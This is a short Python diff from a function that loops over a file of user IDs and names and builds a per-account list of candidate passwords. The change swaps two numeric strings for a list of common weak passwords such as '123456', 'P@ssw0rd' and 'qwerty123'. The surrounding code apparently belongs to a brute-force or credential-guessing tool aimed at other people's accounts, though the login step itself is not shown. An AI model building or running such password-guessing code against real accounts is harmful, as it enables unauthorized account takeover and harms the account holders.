@@ -84,8 +84,15 @@ def gxdsforward(id_file):
         for data in id_file:
             uid=data.split("|")[0]
             pwx=[]
-            pwx.append('57273200')
-            pwx.append('59039200')
+            pwx.append('12345678')
+            pwx.append('P@ssw0rd')
+            pwx.append('123456')
+            pwx.append('iloveyou')
+            pwx.append('1234567890')
+            pwx.append('password')
+            pwx.append('Password')
+            pwx.append('qwerty123')
+            pwx.append('123456789')
             nam=data.split("|")[1]
             name=nam.lower()
             try:
